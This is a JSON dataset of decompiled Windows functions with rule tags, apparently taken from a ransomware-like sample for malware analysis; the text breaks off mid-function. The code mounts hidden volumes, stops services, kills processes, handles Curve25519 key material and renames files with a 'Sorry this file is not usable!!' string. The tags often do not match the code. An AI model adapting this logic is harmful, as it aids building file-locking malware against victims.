{
    "004045a0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004045a0(void)\n\n{\n    int32_t iVar1;\n    uint lpszVolumePathNames;\n    uint lpszVolumeMountPoint;\n    uint lpRootPathName;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint cchBufferLength;\n    uint lpcchReturnLength;\n    int32_t var_14h;\n    uint hFindVolume;\n    int32_t var_ch;\n    int32_t lpszVolumeName;\n    int32_t var_4h;\n    \n    lpRootPathName = 0x401590;\n    var_80h = 0x401598;\n    var_7ch = 0x4015a0;\n    var_78h = 0x4015a8;\n    var_74h = 0x4015b0;\n    var_70h = 0x4015b8;\n    var_6ch = 0x4015c0;\n    var_68h = 0x4015c8;\n    var_64h = 0x4015d0;\n    var_60h = 0x4015d8;\n    var_5ch = 0x4015e0;\n    var_58h = 0x4015e8;\n    var_54h = 0x4015f0;\n    var_50h = 0x4015f8;\n    var_4ch = 0x401600;\n    var_48h = 0x401608;\n    var_44h = 0x401610;\n    var_40h = 0x401618;\n    var_3ch = 0x401620;\n    var_38h = 0x401628;\n    var_34h = 0x401630;\n    var_30h = 0x401638;\n    var_2ch = 4200000;\n    var_28h = 0x401648;\n    var_24h = 0x401650;\n    var_20h = 0x401658;\n    var_4h = 0;\n    cchBufferLength = 0x78;\n    lpcchReturnLength = 0;\n    for (var_ch = 0; var_ch < 0x1a; var_ch = var_ch + 1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)((&lpRootPathName)[var_ch]);\n        if (iVar1 == 1) {\n            (&lpszVolumeMountPoint)[var_4h] = (&lpRootPathName)[var_ch];\n            var_4h = var_4h + 1;\n        }\n    }\n    lpszVolumePathNames._0_2_ = 0;\n    lpszVolumeName = fcn.00412ef0(0x10000);\n    if (lpszVolumeName != 0) {\n        var_14h = fcn.00412ef0(0x10000);\n        if (var_14h != 0) {\n            hFindVolume = (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)(lpszVolumeName, 0x8000);\n            do {\n                if (var_4h == 0) break;\n                iVar1 = (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameW)\n                                  (lpszVolumeName, &lpszVolumePathNames, cchBufferLength, &lpcchReturnLength);\n                if ((iVar1 == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszVolumePathNames),  iVar1 != 3)) {\n                    var_4h = var_4h + -1;\n                    (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)((&lpszVolumeMountPoint)[var_4h], lpszVolumeName);\n                }\n                else {\n                    lpszVolumePathNames._0_2_ = 0;\n                }\n                iVar1 = (*_sym.imp.KERNEL32.dll_FindNextVolumeW)(hFindVolume, lpszVolumeName, 0x8000);\n            } while (iVar1 != 0);\n            (*_sym.imp.KERNEL32.dll_FindVolumeClose)(hFindVolume);\n            fcn.00412f20(var_14h);\n        }\n        fcn.00412f20(lpszVolumeName);\n    }\n    return;\n}\n",
        "token_count": 1124
    },
    "004047d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004047d0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint var_14h;\n    uint hModule;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.00404bd0();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401680);\n        var_4h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x401690);\n        if (var_4h != NULL) {\n            (*var_4h)(&var_8h);\n        }\n    }\n    (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x401718, 0x401708, 0x4016b0, 0, 0);\n    iVar1 = fcn.00404bd0();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401724);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x401734);\n        if (pcVar3 != NULL) {\n            (*pcVar3)(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "00404870": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00404870(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint lpServiceName;\n    uint lpServiceStatus;\n    int32_t var_68h;\n    uint dwMilliseconds;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_30h;\n    uint lpServicesReturned;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t hSCManager;\n    int32_t hSCObject;\n    uint32_t var_10h;\n    uint pcbBytesNeeded;\n    int32_t lpServices;\n    int32_t hService;\n    \n    lpServices = 0;\n    var_1ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    var_20h = 30000;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (hSCManager != 0) {\n        for (var_10h = 0; var_10h < 0x2c; var_10h = var_10h + 1) {\n            hService = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, *(var_10h * 4 + 0x414000), 0x2c);\n            if (hService != 0) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(hService, 0, &var_48h, 0x24, &pcbBytesNeeded);\n                if (((iVar1 != 0) && (var_44h != 1)) && (var_44h != 3)) {\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesA)\n                                      (hService, 1, lpServices, 0, &pcbBytesNeeded, &lpServicesReturned);\n                    if (((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0xea)) &&\n                       (lpServices = fcn.00412ef0(pcbBytesNeeded),  lpServices != 0)) {\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesA)\n                                          (hService, 1, lpServices, pcbBytesNeeded, &pcbBytesNeeded, &lpServicesReturned\n                                          );\n                        if (iVar1 != 0) {\n                            puVar2 = var_10h * 0x24 + lpServices;\n                            puVar3 = &lpServiceName;\n                            for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n                                *puVar3 = *puVar2;\n                                puVar2 = puVar2 + 1;\n                                puVar3 = puVar3 + 1;\n                            }\n                            hSCObject = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0x24);\n                            if ((hSCObject != 0) &&\n                               (iVar1 = (*_sym.imp.ADVAPI32.dll_ControlService)(hSCObject, 1, &lpServiceStatus), \n                               iVar1 != 0)) {\n                                while (var_68h != 1) {\n                                    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                                    iVar1 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)\n                                                      (hSCObject, 0, &lpServiceStatus, 0x24, &pcbBytesNeeded);\n                                    if ((iVar1 != 0) &&\n                                       ((var_68h == 1 ||\n                                        (iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)(),  var_20h < iVar1 - var_1ch))))\n                                    break;\n                                }\n                                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCObject);\n                            }\n                        }\n                        fcn.00412f20(lpServices);\n                    }\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_ControlService)(hService, 1, &var_48h);\n                    if (iVar1 != 0) {\n                        while (var_44h != 1) {\n                            (*_sym.imp.KERNEL32.dll_Sleep)(var_30h);\n                            iVar1 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)\n                                              (hService, 0, &var_48h, 0x24, &pcbBytesNeeded);\n                            if (((iVar1 == 0) || (var_44h == 1)) ||\n                               (iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)(),  var_20h < iVar1 - var_1ch)) break;\n                        }\n                    }\n                }\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hService);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    }\n    return;\n}\n",
        "token_count": 1088
    },
    "00404ab0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00404ab0(void)\n\n{\n    int32_t iVar1;\n    uint var_23ch;\n    uint var_234h;\n    uint lpString2;\n    int32_t var_10h;\n    uint hObject;\n    int32_t hProcess;\n    uint32_t var_4h;\n    \n    hObject = sub.KERNEL32.dll_CreateToolhelp32Snapshot(0xf, 0);\n    var_23ch = 0x22c;\n    var_10h = sub.KERNEL32.dll_Process32FirstW(hObject, &var_23ch);\n    do {\n        if (var_10h == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            return;\n        }\n        for (var_4h = 0; var_4h < 0x1f; var_4h = var_4h + 1) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(var_4h * 4 + 0x4140b0), &lpString2);\n            if (iVar1 == 0) {\n                hProcess = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, var_234h);\n                if (hProcess != 0) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 9);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hProcess);\n                }\n                break;\n            }\n        }\n        var_10h = sub.KERNEL32.dll_Process32NextW();\n    } while( true );\n}\n",
        "token_count": 345
    },
    "00404bd0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00404bd0(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x401670, 0x401660);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n        iVar3 = (*pcVar2)(uVar1);\n        if (iVar3 == 0) {\n            var_4h = 0;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 182
    },
    "00404d20": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404d20(int32_t arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 1;\n    do {\n        if (arg_8h <= var_8h) {\n            return NULL;\n        }\n        var_4h = *(arg_ch + var_8h * 4);\n        var_ch = 0;\n        if (*var_4h == 0x2d) {\n            for (; *var_4h == 0x2d; var_4h = var_4h + 1) {\n            }\n            for (; *var_4h != 0x3d; var_4h = var_4h + 1) {\n                if (*var_4h != *arg_10h) {\n                    var_ch = var_ch + 1;\n                }\n                arg_10h = arg_10h + 1;\n            }\n            if (var_ch == 0) {\n                return var_4h + 1;\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 285
    },
    "00408290": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408290(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    uint uStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint32_t uStack64;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        (&var_60h)[var_4h] = *(arg_ch + var_4h * 8);\n    }\n    for (var_8h = 0; var_8h < 2; var_8h = var_8h + 1) {\n        for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n            if ((var_4h & 1) == 0) {\n                var_24h = (&var_60h)[var_4h] >> 0x1f;\n                iVar3 = ((&var_60h)[var_4h] & (&var_60h)[var_4h] >> 0x1f) >> 0x1a;\n                var_14h = -iVar3;\n                (&var_60h)[var_4h] = iVar3 * -0x4000000 + (&var_60h)[var_4h];\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + iVar3;\n            }\n            else {\n                var_20h = (&var_60h)[var_4h] >> 0x1f;\n                iVar3 = ((&var_60h)[var_4h] & (&var_60h)[var_4h] >> 0x1f) >> 0x19;\n                var_10h = -iVar3;\n                (&var_60h)[var_4h] = iVar3 * -0x2000000 + (&var_60h)[var_4h];\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + iVar3;\n            }\n        }\n        var_28h = uStack64 >> 0x1f;\n        iVar3 = (uStack64 & uStack64 >> 0x1f) >> 0x19;\n        var_18h = -iVar3;\n        uStack64 = iVar3 * -0x2000000 + uStack64;\n        var_60h = var_60h + iVar3 * 0x13;\n    }\n    var_2ch = var_60h >> 0x1f;\n    iVar3 = (var_60h & var_60h >> 0x1f) >> 0x1a;\n    var_1ch = -iVar3;\n    var_60h = iVar3 * -0x4000000 + var_60h;\n    var_5ch = var_5ch + iVar3;\n    for (var_8h = 0; var_8h < 2; var_8h = var_8h + 1) {\n        for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n            if ((var_4h & 1) == 0) {\n                iVar3 = (&var_60h)[var_4h];\n                var_34h = iVar3 >> 0x1a;\n                (&var_60h)[var_4h] = (&var_60h)[var_4h] & 0x3ffffff;\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + (iVar3 >> 0x1a);\n            }\n            else {\n                iVar3 = (&var_60h)[var_4h];\n                var_30h = iVar3 >> 0x19;\n                (&var_60h)[var_4h] = (&var_60h)[var_4h] & 0x1ffffff;\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + (iVar3 >> 0x19);\n            }\n        }\n        var_38h = uStack64 >> 0x19;\n        uStack64 = uStack64 & 0x1ffffff;\n        var_60h = var_38h * 0x13 + var_60h;\n    }\n    var_ch = fcn.00408270(var_60h, 0x3ffffed);\n    for (var_4h = 1; var_4h < 10; var_4h = var_4h + 1) {\n        if ((var_4h & 1) == 0) {\n            uVar1 = fcn.00408210((&var_60h)[var_4h], 0x3ffffff);\n            var_ch = uVar1 & var_ch;\n        }\n        else {\n            uVar1 = fcn.00408210((&var_60h)[var_4h], 0x1ffffff);\n            var_ch = uVar1 & var_ch;\n        }\n    }\n    var_60h = var_60h - (var_ch & 0x3ffffed);\n    for (var_4h = 1; var_4h < 10; var_4h = var_4h + 1) {\n        if ((var_4h & 1) == 0) {\n            (&var_60h)[var_4h] = (&var_60h)[var_4h] - (var_ch & 0x3ffffff);\n        }\n        else {\n            (&var_60h)[var_4h] = (&var_60h)[var_4h] - (var_ch & 0x1ffffff);\n        }\n    }\n    iVar3 = var_5ch << 2;\n    iStack92 = iStack92 << 3;\n    iStack88 = iStack88 << 5;\n    iStack84 = iStack84 << 6;\n    iStack76 = iStack76 << 1;\n    iStack72 = iStack72 << 3;\n    iStack68 = iStack68 << 4;\n    iVar2 = uStack64 << 6;\n    *arg_8h = 0;\n    arg_8h[0x10] = 0;\n    *arg_8h = *arg_8h | var_60h;\n    arg_8h[1] = var_60h >> 8;\n    arg_8h[2] = var_60h >> 0x10;\n    arg_8h[3] = var_60h >> 0x18;\n    arg_8h[3] = arg_8h[3] | iVar3;\n    arg_8h[4] = iVar3 >> 8;\n    arg_8h[5] = iVar3 >> 0x10;\n    arg_8h[6] = iVar3 >> 0x18;\n    arg_8h[6] = arg_8h[6] | iStack92;\n    arg_8h[7] = iStack92 >> 8;\n    arg_8h[8] = iStack92 >> 0x10;\n    arg_8h[9] = iStack92 >> 0x18;\n    arg_8h[9] = arg_8h[9] | iStack88;\n    arg_8h[10] = iStack88 >> 8;\n    arg_8h[0xb] = iStack88 >> 0x10;\n    arg_8h[0xc] = iStack88 >> 0x18;\n    arg_8h[0xc] = arg_8h[0xc] | iStack84;\n    arg_8h[0xd] = iStack84 >> 8;\n    arg_8h[0xe] = iStack84 >> 0x10;\n    arg_8h[0xf] = iStack84 >> 0x18;\n    arg_8h[0x10] = arg_8h[0x10] | uStack80;\n    arg_8h[0x11] = uStack80 >> 8;\n    arg_8h[0x12] = uStack80 >> 0x10;\n    arg_8h[0x13] = uStack80 >> 0x18;\n    arg_8h[0x13] = arg_8h[0x13] | iStack76;\n    arg_8h[0x14] = iStack76 >> 8;\n    arg_8h[0x15] = iStack76 >> 0x10;\n    arg_8h[0x16] = iStack76 >> 0x18;\n    arg_8h[0x16] = arg_8h[0x16] | iStack72;\n    arg_8h[0x17] = iStack72 >> 8;\n    arg_8h[0x18] = iStack72 >> 0x10;\n    arg_8h[0x19] = iStack72 >> 0x18;\n    arg_8h[0x19] = arg_8h[0x19] | iStack68;\n    arg_8h[0x1a] = iStack68 >> 8;\n    arg_8h[0x1b] = iStack68 >> 0x10;\n    arg_8h[0x1c] = iStack68 >> 0x18;\n    arg_8h[0x1c] = arg_8h[0x1c] | iVar2;\n    arg_8h[0x1d] = iVar2 >> 8;\n    arg_8h[0x1e] = iVar2 >> 0x10;\n    arg_8h[0x1f] = iVar2 >> 0x18;\n    return;\n}\n",
        "token_count": 2412
    },
    "00409830": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNewFilePointer\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: nNumberOfBytesToWrite\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Variable defined which should be unmapped: hObject\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesWritten\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: hProcess\n// WARNING: Variable defined which should be unmapped: lpNewFileName\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: liDistanceToMove\n// WARNING: Variable defined which should be unmapped: lpFileSize\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409830(uint *lpExistingFileName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t aiStackY11460 [3];\n    uint auStackY11448 [160];\n    int32_t aiStackY10808 [1507];\n    uint var_12a8h;\n    uint var_224h;\n    uint var_1dch;\n    uint var_198h;\n    uint var_178h;\n    uint var_158h;\n    uint var_138h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint pbBuffer;\n    uint8_t uStackY213;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint32_t var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint *var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint *var_78h;\n    uint *var_74h;\n    uint *var_70h;\n    uint *var_6ch;\n    uint *var_68h;\n    uint *var_64h;\n    uint *var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *lpNumberOfBytesWritten;\n    uint *hProcess;\n    uint *lpNewFileName;\n    uint *nNumberOfBytesToWrite;\n    uint *lpFileSize;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *liDistanceToMove;\n    uint *lpNewFilePointer;\n    uint *var_ch;\n    uint *lpBuffer;\n    uint *hObject;\n    \n    hObject = 0x40983d;\n    fcn.004132b0();\n    var_c8h._0_1_ = 9;\n    stack0xffffff35 = 0;\n    var_c3h = 0;\n    var_bfh = 0;\n    var_bbh = 0;\n    var_b7h = 0;\n    var_b3h = 0;\n    var_afh = 0;\n    var_abh._0_2_ = 0;\n    var_abh._2_1_ = 0;\n    var_6ch = 0x1;\n    var_130h = 0x72726f53;\n    var_12ch = 0x742079;\n    var_128h = 0x20736968;\n    var_124h = 0x656c6966;\n    var_120h = 0x20736920;\n    var_11ch = 0x20746f6e;\n    var_118h = 0x62617375;\n    var_114h = 0x2121656c;\n    hObject = 0x80;\n    lpBuffer = lpExistingFileName;\n    var_ch = 0x4098e7;\n    (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n    var_ch = lpExistingFileName;\n    _liDistanceToMove = CONCAT44(0x4098f1, liDistanceToMove);\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n    iVar1 = iVar1 * 2 + 0xe;\n    _liDistanceToMove = CONCAT44(iVar1, 0x4098fb);\n    lpNewFileName = fcn.00412ef0(iVar1);\n    if (lpNewFileName != NULL) {\n        _liDistanceToMove = CONCAT44(lpExistingFileName, lpNewFileName);\n        var_18h = 0x409919;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        var_18h = 0x403af4;\n        var_1ch = lpNewFileName;\n        lpFileSize = 0x409928;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)();\n        lpFileSize = 0x9;\n        nNumberOfBytesToWrite = lpNewFileName;\n        lpNewFileName = lpExistingFileName;\n        hProcess = 0x409938;\n        iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileExW)();\n        if (iVar1 == 0) {\n            if (*0x41426c != 0) {\n                hProcess = NULL;\n                lpNumberOfBytesWritten = NULL;\n                var_34h = NULL;\n                var_38h = NULL;\n                var_3ch = lpExistingFileName;\n                var_40h = 0x40a341;\n                var_40h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                var_44h = lpExistingFileName;\n                var_48h = NULL;\n                var_4ch = 0xfde9;\n                _var_54h = CONCAT44(0x40a353, var_54h);\n                var_78h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                _var_54h = CONCAT44(var_78h, 0x40a35f);\n                var_4ch = fcn.00412ef0(var_78h);\n                _var_54h = 0;\n                _var_5ch = CONCAT44(var_78h, var_4ch);\n                var_60h = lpExistingFileName;\n                var_64h = 0x40a37b;\n                var_64h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                var_68h = lpExistingFileName;\n                var_6ch = NULL;\n                var_70h = 0xfde9;\n                var_74h = 0x40a38d;\n                (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                var_74h = 0x40a393;\n                var_74h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_78h = var_4ch;\n                var_7ch = 0x403b80;\n                var_80h = 0x40a3a2;\n                fcn.00404dd0(0x403b80, var_4ch, var_74h);\n                var_74h = var_4ch;\n                var_78h = 0x40a3ae;\n                fcn.00412f20(var_4ch);\n            }\n        }\n        else {\n            while( true ) {\n                hProcess = NULL;\n                lpNumberOfBytesWritten = 0x8000000;\n                var_34h = 0x3;\n                var_38h = NULL;\n                var_3ch = NULL;\n                var_40h = 0xc0000000;\n                var_44h = lpNewFileName;\n                var_48h = 0x40995c;\n                (*_sym.imp.KERNEL32.dll_CreateFileW)();\n                hObject = 0x409968;\n                fcn.00412f20(lpNewFileName);\n                if (hObject != 0xffffffff) break;\n                if (var_6ch == NULL) {\n                    if (*0x41426c == 0) {\n                        return;\n                    }\n                    hObject = NULL;\n                    lpBuffer = NULL;\n                    var_ch = NULL;\n                    lpNewFilePointer = lpExistingFileName;\n                    liDistanceToMove = 0x40a2ad;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    _liDistanceToMove = CONCAT44(lpNewFilePointer, uVar2);\n                    var_18h = lpExistingFileName;\n                    var_1ch = NULL;\n                    lpFileSize = 0xfde9;\n                    nNumberOfBytesToWrite = 0x40a2bf;\n                    var_74h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    lpNewFileName = 0x40a2cb;\n                    nNumberOfBytesToWrite = var_74h;\n                    var_48h = fcn.00412ef0(var_74h);\n                    nNumberOfBytesToWrite = NULL;\n                    lpNewFileName = NULL;\n                    hProcess = var_74h;\n                    var_34h = lpExistingFileName;\n                    var_38h = 0x40a2e7;\n                    lpNumberOfBytesWritten = var_48h;\n                    var_38h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    var_3ch = lpExistingFileName;\n                    var_40h = NULL;\n                    var_44h = 0xfde9;\n                    var_48h = 0x40a2f9;\n                    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    var_48h = 0x40a2ff;\n                    var_4ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    _var_54h = 0x403b5c0040a30e;\n                    var_48h = var_4ch;\n                    fcn.00404dd0(0x403b5c, var_4ch, var_4ch);\n                    var_4ch = 0x40a31a;\n                    fcn.00412f20(var_48h);\n                    return;\n                }\n                var_18h = NULL;\n                hObject = NULL;\n                lpBuffer = &fcn.00409830::var_1dch;\n                var_ch = 0x409e86;\n                fcn.00412e80(lpBuffer, 0, 0x42);\n                hObject = NULL;\n                lpBuffer = &fcn.00409830::var_40h;\n                var_ch = 0x409e9b;\n                iVar1 = sub.RstrtMgr.DLL_RmStartSession();\n                var_7ch = iVar1 == 0;\n                if (var_7ch == 0) {\n                    if (*0x41426c == 0) {\n                        return;\n                    }\n                    var_ch = NULL;\n                    _liDistanceToMove = 0;\n                    var_18h = NULL;\n                    var_1ch = lpExistingFileName;\n                    lpFileSize = 0x40a21c;\n                    lpFileSize = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    nNumberOfBytesToWrite = lpExistingFileName;\n                    lpNewFileName = NULL;\n                    hProcess = 0xfde9;\n                    lpNumberOfBytesWritten = 0x40a22e;\n                    var_70h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    var_34h = 0x40a23a;\n                    lpNumberOfBytesWritten = var_70h;\n                    var_3ch = fcn.00412ef0(var_70h);\n                    lpNumberOfBytesWritten = NULL;\n                    var_34h = NULL;\n                    var_38h = var_70h;\n                    var_40h = lpExistingFileName;\n                    var_44h = 0x40a256;\n                    var_44h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    var_48h = lpExistingFileName;\n                    var_4ch = NULL;\n                    var_50h = 0xfde9;\n                    var_54h = 0x40a268;\n                    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    var_54h = var_18h;\n                    _var_5ch = CONCAT44(var_44h, 0x403b44);\n                    var_60h = 0x40a27a;\n                    fcn.00404dd0(0x403b44, var_44h, var_18h);\n                    _var_54h = CONCAT44(var_50h, var_44h);\n                    _var_5ch = CONCAT44(0x40a286, var_5ch);\n                    